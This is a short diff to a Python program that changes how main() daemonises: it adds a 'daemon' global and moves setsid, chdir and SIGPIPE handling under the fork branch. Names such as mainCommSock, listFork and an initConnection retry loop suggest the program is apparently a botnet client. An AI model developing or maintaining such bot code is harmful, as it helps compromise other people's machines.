@@ -475,7 +475,7 @@ def listFork():
 
 
 def main():
-    global numpids, pids, mainCommSock
+    global numpids, pids, mainCommSock, daemon
 
     # Deterministic randomness
     seed = os.getpid() ^ int(time.time())
@@ -492,9 +492,9 @@ def main():
         if os.fork() != 0:
             os._exit(0)
 
-    os.setsid()
-    os.chdir("/")
-    signal.signal(signal.SIGPIPE, signal.SIG_IGN)
+        os.setsid()
+        os.chdir("/")
+        signal.signal(signal.SIGPIPE, signal.SIG_IGN)
 
     while True:
         while initConnection() != 0:
